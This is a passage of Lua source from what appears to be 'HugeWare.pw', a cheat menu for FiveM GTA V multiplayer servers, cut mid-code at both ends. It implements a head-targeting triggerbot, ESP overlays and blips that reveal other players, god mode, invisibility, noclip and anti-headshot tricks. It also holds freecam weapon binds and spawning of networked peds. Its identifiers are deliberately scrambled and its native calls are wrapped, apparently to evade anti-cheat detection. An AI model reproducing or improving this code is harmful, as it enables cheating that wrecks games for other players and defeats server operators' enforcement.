                                    SetCamCoord(
                                        freecam_cam,
                                        GetCamCoord(freecam_cam) + (RotationToDirection(freecam_cam_rot) * (0.5 * 1.5))
                                    )
                                end
                            elseif IsDisabledControlPressed(1, 33) then
                                SetCamCoord(
                                    freecam_cam,
                                    GetCamCoord(freecam_cam) - (RotationToDirection(freecam_cam_rot) * (0.5 * 1.5))
                                )
                            end

                            if (IsDisabledControlPressed(1, 21)) then -- SHIFT
                                z = z + (0.1 * 2.5)
                            end
                            if (IsDisabledControlPressed(1, 36)) then -- LEFT CTRL
                                z = z - (0.1 * 0.5)
                            end

                            SetFocusArea(
                                GetCamCoord(freecam_cam).x,
                                GetCamCoord(freecam_cam).y,
                                GetCamCoord(freecam_cam).z,
                                0.0,
                                0.0,
                                0.0
                            )
                            SetCamRot(freecam_cam, offsetRotX, offsetRotY, offsetRotZ, 2)

                            --DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.35, 0.35, 0.35, 0,255,255, 175, false, true, 2, nil, nil, false)
                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["RIGHT"]) then
                                HugeV.locals.tryb = HugeV.locals.tryb + 1
                                if HugeV.locals.tryb > #HugeV.locals.modes then
                                    HugeV.locals.tryb = 1
                                end
                            end

                            if IsDisabledControlJustPressed(1, HugeV.locals.keys["LEFT"]) then
                                HugeV.locals.tryb = HugeV.locals.tryb - 1
                                if HugeV.locals.tryb < 1 then
                                    HugeV.locals.tryb = #HugeV.locals.modes
                                end
                            end
                            text_szpachlan_szmata("~g~Freecam Mode: " .. currentmode, false, 0.3, 0, 0.02, 0.41)
                            if currentmode == "Look Around" then
                                text_szpachlan_szmata(
                                    "Binds: \nC - Clone Entity\nHome - Delete Entity",
                                    false,
                                    0.3,
                                    0,
                                    0.02,
                                    0.43
                                )
                            elseif currentmode == "Shoot" then
                                text_szpachlan_szmata(
                                    "Binds: \nR - Rocket\nMOUSE2 - Stun Gun\nQ - AK-47",
                                    false,
                                    0.3,
                                    0,
                                    0.02,
                                    0.43
                                )
                            end
                        end
                    end
                end
            end
        end
    end
)

function TriggerBot_Shoot(Player)
    local SDIUGYUSDGISYDUGSDGEW = GetPedBoneCoords(Player, HugeV.locals.AllBones["HEAD"], 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(
        HugeV.Player.PedId,
        SDIUGYUSDGISYDUGSDGEW.x,
        SDIUGYUSDGISYDUGSDGEW.y,
        SDIUGYUSDGISYDUGSDGEW.z,
        true
    )
end

Citizen.CreateThread(
    function()
        while HugeV.locals.MenuEnabled do
            Citizen.Wait(0)

            HugeV.locals.ids = GetActivePlayers()
            HugeV.locals.vehicles = {}
            HugeV.locals.peds = {}

            for vehicle in EnumerateVehicles() do
                table.insert(HugeV.locals.vehicles, vehicle)
            end

            for ped in EnumeratePeds() do
                table.insert(HugeV.locals.peds, ped)
            end

            local color = RGB_Rainbow_DSUGSIDGSD(1.0)
            if not HugeV.locals.draw_aimbot_fov and HugeV.locals.legit_aimbot and not HugeV.locals.Displayed then
                DrawRect(0.5, 0.5, 0.195, 0.195, 255, 255, 255, 100)
            end

            if HugeV.locals.trials then
                local coords = GetPedBoneCoords(HugeV.Player.PedId, 0xE0FD)
                DrawTrails(5000, coords.x, coords.y, coords.z)
            else
                HugeV.locals.trails_table = {}
            end

            if HugeV.locals.trials then
                if #HugeV.locals.trails_table > 0 then
                    for notificationIndex_DSUGSDIGSDG = 1, #HugeV.locals.trails_table do
                        local trials_DGSDGSD = HugeV.locals.trails_table[notificationIndex_DSUGSDIGSDG]

                        if trials_DGSDGSD then
                            local timer =
                                (Czitirzen_InvokeNative(0x9CD27B0045628463) - trials_DGSDGSD["startTime_DSGISDOGSDG"]) /
                                trials_DGSDGSD["delay"] *
                                100
                            DrawMarker(
                                28,
                                trials_DGSDGSD["x1"],
                                trials_DGSDGSD["y1"],
                                trials_DGSDGSD["z1"],
                                0.0,
                                0.0,
                                0.0,
                                0.0,
                                180.0,
                                0.0,
                                0.2,
                                0.2,
                                0.2,
                                color.r,
                                color.g,
                                color.b,
                                255,
                                false,
                                true,
                                2,
                                nil,
                                nil,
                                false
                            )

                            if timer >= 100 then
                                table.remove(HugeV.locals.trails_table, notificationIndex_DSUGSDIGSDG)
                            end
                        end
                    end
                end
            end

            if HugeV.locals.TriggerBot then
                local Aiming, target = GetEntityPlayerIsFreeAimingAt(Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), target)
                if Aiming then
                    if IsEntityAPed(target) and not IsPedDeadOrDying(target, 0) and IsPedAPlayer(target) then
                        TriggerBot_Shoot(target)
                    end
                end
            end

            if HugeV.locals.shoot_impact then
                if IsDisabledControlPressed(0, 24) then
                    local _, coords_shoot = GetPedLastWeaponImpactCoord(HugeV.Player.PedId)
                    local coords = GetPedBoneCoords(HugeV.Player.PedId, 0xDEAD)
                    if coords_shoot ~= nil and coords_shoot.x ~= 0.0 then
                        DrawImpact(5000, coords.x, coords.y, coords.z, coords_shoot.x, coords_shoot.y, coords_shoot.z)
                    end
                end
            end

            if HugeV.locals.shoot_impact then
                if #HugeV.locals.impacts > 0 then
                    for notificationIndex_DSUGSDIGSDG = 1, #HugeV.locals.impacts do
                        local impact_SDFU = HugeV.locals.impacts[notificationIndex_DSUGSDIGSDG]

                        if impact_SDFU then
                            local timer =
                                (Czitirzen_InvokeNative(0x9CD27B0045628463) - impact_SDFU["startTime_DSGISDOGSDG"]) /
                                impact_SDFU["delay"] *
                                100
                            DrawLine(
                                impact_SDFU["x1"],
                                impact_SDFU["y1"],
                                impact_SDFU["z1"],
                                impact_SDFU["x2"],
                                impact_SDFU["y2"],
                                impact_SDFU["z2"],
                                255,
                                0,
                                0,
                                255
                            )
                            DrawMarker(
                                28,
                                impact_SDFU["x2"],
                                impact_SDFU["y2"],
                                impact_SDFU["z2"],
                                0.0,
                                0.0,
                                0.0,
                                0.0,
                                180.0,
                                0.0,
                                0.05,
                                0.05,
                                0.05,
                                204,
                                198,
                                14,
                                255,
                                false,
                                true,
                                2,
                                nil,
                                nil,
                                false
                            )

                            if timer >= 100 then
                                table.remove(HugeV.locals.impacts, notificationIndex_DSUGSDIGSDG)
                            end
                        end
                    end
                end
            end

            if HugeV.locals.Ragdoll then
                SetPedToRagdoll(HugeV.Player.PedId, 1000, 1000, 0, true, true, false)
            end

            if HugeV.locals.GodMode then
                Czitirzen_InvokeNative(0x3882114BDE571AD4, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), true)
                Czitirzen_InvokeNative(0x239528EACDC3E7DE, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), true)
                Czitirzen_InvokeNative(0x8FE22675A5A45817, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1))
                Czitirzen_InvokeNative(0x3AC1F7B898F30C05, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1))
                Czitirzen_InvokeNative(0x0E98F88A24C5F4B8, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1))
                Czitirzen_InvokeNative(
                    0xFAEE099C6F890BB8,
                    Czitirzen_InvokeNative(0x43A66C31C68491C0, -1),
                    true,
                    true,
                    true,
                    true,
                    true,
                    true,
                    true,
                    true
                )
                Czitirzen_InvokeNative(0x79F020FF9EDC0748, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false)
                Czitirzen_InvokeNative(0x1760FFA8AB074D66, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false)
            else
                Czitirzen_InvokeNative(0x3882114BDE571AD4, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false)
                Czitirzen_InvokeNative(0x239528EACDC3E7DE, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), false)
                Czitirzen_InvokeNative(0x0E98F88A24C5F4B8, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1))
                Czitirzen_InvokeNative(
                    0xFAEE099C6F890BB8,
                    Czitirzen_InvokeNative(0x43A66C31C68491C0, -1),
                    false,
                    false,
                    false,
                    false,
                    false,
                    false,
                    false,
                    false
                )
                Czitirzen_InvokeNative(0x79F020FF9EDC0748, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), true)
                Czitirzen_InvokeNative(0x1760FFA8AB074D66, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), true)
            end

            if #HugeV.locals.notifications > 0 then
                --DrawRect(0.85, 0.2, 0.25, 0.3, 0, 0, 0, 255) -- dul
                for notificationIndex_DSUGSDIGSDG = 1, #HugeV.locals.notifications do
                    local notification_ASDFUSDIGSDG = HugeV.locals.notifications[notificationIndex_DSUGSDIGSDG]

                    if notification_ASDFUSDIGSDG then
                        notification_ASDFUSDIGSDG["opacity_DSGIHSDIGSDGDSG"] =
                            (notification_ASDFUSDIGSDG["opacity_DSGIHSDIGSDGDSG"] or
                            (notification_ASDFUSDIGSDG["time_DSGIUSDGSDG"] / 1000) * 60) - 1

                        local offset_AFUHDSIUFSDGDSG = 0.005 + (notificationIndex_DSUGSDIGSDG * 1.3)
                        local notificationTimer_ADUFYDSIUGSDG =
                            (Czitirzen_InvokeNative(0x9CD27B0045628463) -
                            notification_ASDFUSDIGSDG["startTime_DSGISDOGSDG"]) /
                            notification_ASDFUSDIGSDG["time_DSGIUSDGSDG"] *
                            100
                        if notification_ASDFUSDIGSDG["type"] == "ERROR" then
                            jakie = "[~r~HugeWare.pw~s~]"
                            text = notification_ASDFUSDIGSDG["text_DSGUSIDGSDG"]
                        elseif notification_ASDFUSDIGSDG["type"] == "SUCCES" then
                            jakie = "[~g~HugeWare.pw~s~]"
                            text = notification_ASDFUSDIGSDG["text_DSGUSIDGSDG"]
                        elseif notification_ASDFUSDIGSDG["type"] == "INFO" then
                            jakie = "[~b~HugeWare.pw~s~]"
                            text = notification_ASDFUSDIGSDG["text_DSGUSIDGSDG"]
                        end
                        text_szpachlan_szmata(jakie .. " " .. text, false, 0.25, 0, 0.1, 0.01 * offset_AFUHDSIUFSDGDSG)

                        if notificationTimer_ADUFYDSIUGSDG >= 100 then
                            table.remove(HugeV.locals.notifications, notificationIndex_DSUGSDIGSDG)
                        end
                    end
                end
            end

            if AntiHS_TEST then
                for i = 1, #HugeV.locals.ids do
                    local bool, coords = GetPedLastWeaponImpactCoord(GetPlayerPed(HugeV.locals.ids[i]))
                    if bool then
                        local head = GetPedBoneCoords(PlayerPedId(), 31086)
                        if
                            (coords.x + 2 < head.x) and (coords.x - 2 > head.x) and (coords.y + 2 < head.y) and
                                (coords.y - 2 > head.y) and
                                (coords.z + 2 < head.z) and
                                (coords.z - 2 > head.z)
                         then
                            ClearPedLastWeaponDamage(PlayerPedId())
                        end
                    end
                end
            end

            if HugeV.locals.rainbow_menu then
                local color = RGB_Rainbow_DSUGSIDGSD(1.0)
                HugeV.menu_color.HugeWare_pw = {
                    r = color.r,
                    g = color.g,
                    b = color.b
                }
                HugeV.menu_color.buttons = {
                    r = color.r,
                    g = color.g,
                    b = color.b
                }
            end

            if HugeV.locals.eGun then
                local bool, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if bool then
                    if HugeV.locals.peds[1] == HugeV.Player.PedId then
                        Czitirzen_InvokeNative(
                            0x172AA1B624FA1013,
                            HugeV.locals.peds[2],
                            coords.x,
                            coords.y,
                            coords.z,
                            15
                        )
                    else
                        Czitirzen_InvokeNative(
                            0x172AA1B624FA1013,
                            HugeV.locals.peds[1],
                            coords.x,
                            coords.y,
                            coords.z,
                            15
                        )
                    end
                end
            end

            if NoVehicleGravity and IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                print("hold shift to no gravity")
                if IsControlPressed(1, HugeV.locals.keys["E"]) then
                    local HMqfDSIRICfvn = GetVehiclePedIsIn(GetPlayerPed(-1), 0.0)
                    SetVehicleGravityAmount(HMqfDSIRICfvn, 1.0)
                else
                    local N1r9k5 = GetVehiclePedIsIn(GetPlayerPed(-1), 0.0)
                    SetVehicleGravityAmount(N1r9k5, 9.80000019)
                end
            end

            if HugeV.locals.Invisible then
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 31086),
                    GetPedBoneCoords(HugeV.Player.PedId, 0x9995),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0x9995),
                    GetPedBoneCoords(HugeV.Player.PedId, 0xE0FD),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0x5C57),
                    GetPedBoneCoords(HugeV.Player.PedId, 0xE0FD),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0x192A),
                    GetPedBoneCoords(HugeV.Player.PedId, 0xE0FD),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0x3FCF),
                    GetPedBoneCoords(HugeV.Player.PedId, 0x192A),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0xCC4D),
                    GetPedBoneCoords(HugeV.Player.PedId, 0x3FCF),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0xB3FE),
                    GetPedBoneCoords(HugeV.Player.PedId, 0x5C57),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0xB3FE),
                    GetPedBoneCoords(HugeV.Player.PedId, 0x3779),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0x9995),
                    GetPedBoneCoords(HugeV.Player.PedId, 0xB1C5),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0xB1C5),
                    GetPedBoneCoords(HugeV.Player.PedId, 0xEEEB),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0xEEEB),
                    GetPedBoneCoords(HugeV.Player.PedId, 0x49D9),
                    0,
                    255,
                    0,
                    255
                )

                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0x9995),
                    GetPedBoneCoords(HugeV.Player.PedId, 0x9D4D),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0x9D4D),
                    GetPedBoneCoords(HugeV.Player.PedId, 0x6E5C),
                    0,
                    255,
                    0,
                    255
                )
                DrawLine(
                    GetPedBoneCoords(HugeV.Player.PedId, 0x6E5C),
                    GetPedBoneCoords(HugeV.Player.PedId, 0xDEAD),
                    0,
                    255,
                    0,
                    255
                )

                Czitirzen_InvokeNative(0xEA1C610A04DB6BBB, HugeV.Player.PedId, false, false)
                Czitirzen_InvokeNative(0x241E289B5C059EDC, HugeV.Player.PedId, true)
                Czitirzen_InvokeNative(0x44A0870B7E92D7C0, HugeV.Player.PedId, 0)
                local head = GetPedBoneCoords(HugeV.Player.PedId, 31086)
                DrawMarker(
                    28,
                    head.x,
                    head.y,
                    head.z + 0.06,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    180.0,
                    0.0,
                    0.1,
                    0.1,
                    0.1,
                    0,
                    255,
                    0,
                    255,
                    false,
                    true,
                    2,
                    nil,
                    nil,
                    false
                )
            else
                Czitirzen_InvokeNative(0xEA1C610A04DB6BBB, HugeV.Player.PedId, true, true)
                Czitirzen_InvokeNative(0x44A0870B7E92D7C0, HugeV.Player.PedId, 255)
            end

            if HugeV.locals.JumpMod and IsPedInAnyVehicle(PlayerPedId(), true) then
                if IsControlJustPressed(1, HugeV.locals.keys["SPACE"]) then
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 9.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, 1, 0.0, 1)
                end
            end

            if HugeV.locals.SexyGunKappa then
                local bool, coords = GetPedLastWeaponImpactCoord(HugeV.Player.PedId)
                if bool then
                    RXx("scr_rcbarry2", "scr_clown_appears", bool)
                end
            end

            if HugeV.locals.catgun then
                local bool, coords = GetPedLastWeaponImpactCoord(HugeV.Player.PedId)
                if bool then
                    RequestModelSync_SDUFHSIDGSDG("a_c_cat_01")
                    for PETLATYKURWOZONETAPAJEBANA = 0, 5 do
                        CreatePed(
                            4,
                            GetHashKey("a_c_cat_01"),
                            coords.x,
                            coords.y,
                            coords.z,
                            GetEntityHeading(HugeV.Player.PedId),
                            true,
                            true
                        )
                    end
                end
            end

            if HugeV.locals.Noclip2 then
                local NoclipSpeed = 1
                local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
                local k = nil
                local x, y, z = nil, nil, nil

                if not isInVehicle then
                    k = PlayerPedId()
                    x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
                else
                    k = GetVehiclePedIsIn(PlayerPedId(), 0)
                    x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
                end

                if isInVehicle then
                    RequestControlOnce_chuj_dupa_cipa(k)
                end

                local dx, dy, dz = GetCamDirection_Czlowiek_KOZACZEK()
                SetEntityVisible(PlayerPedId(), 0, 0)
                SetEntityVisible(k, 0, 0)

                SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)

                if IsDisabledControlPressed(0, HugeV.locals.keys["LEFTSHIFT"]) then -- Change speed
                    NoclipSpeed = NoclipSpeed * 5
                end

                if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
                    x = x + NoclipSpeed * dx
                    y = y + NoclipSpeed * dy
                    z = z + NoclipSpeed * dz
                end

                if IsDisabledControlPressed(0, 269) then -- MOVE BACK
                    x = x - NoclipSpeed * dx
                    y = y - NoclipSpeed * dy
                    z = z - NoclipSpeed * dz
                end

                if IsDisabledControlPressed(0, HugeV.locals.keys["SPACE"]) then -- MOVE UP
                    z = z + NoclipSpeed
                end

                if IsDisabledControlPressed(0, HugeV.locals.keys["LEFTCTRL"]) then -- MOVE DOWN
                    z = z - NoclipSpeed
                end

                SetFocusArea(
                    GetEntityCoords(PlayerPedId()).x,
                    GetEntityCoords(PlayerPedId()).y,
                    GetEntityCoords(PlayerPedId()).z,
                    0.0,
                    0.0,
                    0.0
                )
                SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
            end

            if HugeV.locals.InfiniteStamina then
                ResetPlayerStamina(HugeV.Player.LocalId)
            end

            if HugeV.locals.SuperJump then
                SetSuperJumpThisFrame(HugeV.Player.LocalId)
            end

            if HugeV.locals.NeverWanted then
                ClearPlayerWantedLevel(HugeV.Player.LocalId)
            end

            if HugeV.locals.tinyplayer then
                SetSeethrough(false)
                SetPedConfigFlag(HugeV.Player.PedId, 223, true)
            else
                SetPedConfigFlag(HugeV.Player.PedId, 223, false)
            end

            if HugeV.locals.discordPresence then
			
			else
                Czitirzen_InvokeNative(0x6A02254D, tostring(0))
                Czitirzen_InvokeNative(0x53DFD530, tostring(""))
                Czitirzen_InvokeNative(0x7BDCBD45, tostring(""))
                Czitirzen_InvokeNative(0xB029D2FA, tostring(""))
                Czitirzen_InvokeNative(0xF61D04C4, tostring(""))
                Czitirzen_InvokeNative(0x35E62B6A, tostring(""))
            end

            if HugeV.locals.esp_switch then
                for i_didsfyg98sduriesdfg = 0, #HugeV.locals.ids do
                    local kolorek_espa_xd_IDHFUDSHUIFDSF = {r = 0, g = 255, b = 0}
                    local pPed_dushsigdsfgdf =
                        Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.ids[i_didsfyg98sduriesdfg])
                    local cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf =
                        table.unpack(GetEntityCoords(Czitirzen_InvokeNative(0xD80958FC74E988A6, -1)))
                    local x, y, z = table.unpack(GetEntityCoords(pPed_dushsigdsfgdf))
                    local disPlayerNames_udsguydgdresd = 130
                    local disPlayerNamesz_dusghudfhigsdfg = 999999
                    local distance_idshgisudfgsdfg =
                        math.floor(
                        GetDistanceBetweenCoords(cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf, x, y, z, true)
                    )
                    if nameabove_duhsgsiudgsdgrdf then
                        if (distance_idshgisudfgsdfg < disPlayerNames_udsguydgdresd) then
                            if
                                Czitirzen_InvokeNative(
                                    0x031E11F3D447647E,
                                    HugeV.locals.ids[i_didsfyg98sduriesdfg],
                                    Citizen.ReturnResultAnyway()
                                )
                             then
                                DrawText3D_HugeV_UDGUYSDHUGSFFDG(
                                    x,
                                    y,
                                    z + 1.2,
                                    GetPlayerServerId(HugeV.locals.ids[i_didsfyg98sduriesdfg]) ..
                                        "  |  " .. GetPlayerName(HugeV.locals.ids[i_didsfyg98sduriesdfg]),
                                    kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                    kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                    kolorek_espa_xd_IDHFUDSHUIFDSF.b
                                )
                            else
                                DrawText3D_HugeV_UDGUYSDHUGSFFDG(
                                    x,
                                    y,
                                    z + 1.2,
                                    GetPlayerServerId(HugeV.locals.ids[i_didsfyg98sduriesdfg]) ..
                                        "  |  " .. GetPlayerName(HugeV.locals.ids[i_didsfyg98sduriesdfg]),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                    end
                    local message_UDYUGSIDGFDG =
                        "Name: " ..
                        GetPlayerName(HugeV.locals.ids[i_didsfyg98sduriesdfg]) ..
                            "\nServer ID: " ..
                                GetPlayerServerId(HugeV.locals.ids[i_didsfyg98sduriesdfg]) ..
                                    "\nDist: " ..
                                        math.round(
                                            GetDistanceBetweenCoords(
                                                cx_duihsgiudfgdf,
                                                cy_duhifsudgsdfg,
                                                cz_dsyaugfidsgsdf,
                                                x,
                                                y,
                                                z,
                                                true
                                            ),
                                            1
                                        )
                    if (distance_idshgisudfgsdfg < disPlayerNamesz_dusghudfhigsdfg) then
                        if HugeV.locals.esp_info and HugeV.locals.esp_switch then
                            DrawText3D_HugeV_UDGUYSDHUGSFFDG(
                                x,
                                y,
                                z - 1.0,
                                message_UDYUGSIDGFDG,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b
                            )
                        end
                        if HugeV.locals.esp_box and HugeV.locals.esp_switch then
                            DrawLineBox(
                                pPed_dushsigdsfgdf,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                        end
                        if HugeV.locals.esp_lines and HugeV.locals.esp_switch then
                            Czitirzen_InvokeNative(
                                0x6B7256074AE34680,
                                cx_duihsgiudfgdf,
                                cy_duhifsudgsdfg,
                                cz_dsyaugfidsgsdf,
                                x,
                                y,
                                z,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                        end
                        if HugeV.locals.esp_skeleton then
                            Czitirzen_InvokeNative(0x44A0870B7E92D7C0, pPed_dushsigdsfgdf, 150)
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 31086),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x9995),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x9995),
                                GetEntityCoords(pPed_dushsigdsfgdf),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x5C57),
                                GetEntityCoords(pPed_dushsigdsfgdf),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x192A),
                                GetEntityCoords(pPed_dushsigdsfgdf),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x3FCF),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x192A),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0xCC4D),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x3FCF),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0xB3FE),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x5C57),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0xB3FE),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x3779),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x9995),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0xB1C5),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0xB1C5),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0xEEEB),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0xEEEB),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x49D9),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )

                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x9995),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x9D4D),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x9D4D),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x6E5C),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                            DrawLine(
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0x6E5C),
                                GetPedBoneCoords(pPed_dushsigdsfgdf, 0xDEAD),
                                kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                                kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                                255
                            )
                        end
                    end
                end
            end

            if HugeV.locals.PlayerBlips then
                -- show blips
                local plist_DSGUSDIGDS = GetActivePlayers()
                for i_SDUGIHSDGSDGDSG = 1, #plist_DSGUSDIGDS do
                    local id_DSHGSIUDGSD = plist_DSGUSDIGDS[i_SDUGIHSDGSDGDSG]
                    local ped_DSGUISDGSDG = Czitirzen_InvokeNative(0x43A66C31C68491C0, id_DSHGSIUDGSD)
                    if ped_DSGUISDGSDG ~= Czitirzen_InvokeNative(0xD80958FC74E988A6) then
                        local blip_DSUFSDGSD = Czitirzen_InvokeNative(0xBC8DBDCA2436F7E8, ped_DSGUISDGSDG)

                        if not Czitirzen_InvokeNative(0xA6DB27D19ECBB7DA, blip_DSUFSDGSD) then -- Add blip_DSUFSDGSD and create head_DSGHDSIUGDS display on Player
                            blip_DSUFSDGSD = Czitirzen_InvokeNative(0x5CDE92C702A8FCE7, ped_DSGUISDGSDG)
                            Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 1)
                            Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                        else -- update blip_DSUFSDGSD
                            local veh_DSGIJSODGSDG = GetVehiclePedIsIn(ped_DSGUISDGSDG, false)
                            local blipSprite_DSIOGJOISDGSDG = GetBlipSprite(blip_DSUFSDGSD)

                            if GetEntityHealth(ped_DSGUISDGSDG) == 0 then -- dead
                                if blipSprite_DSIOGJOISDGSDG ~= 274 then
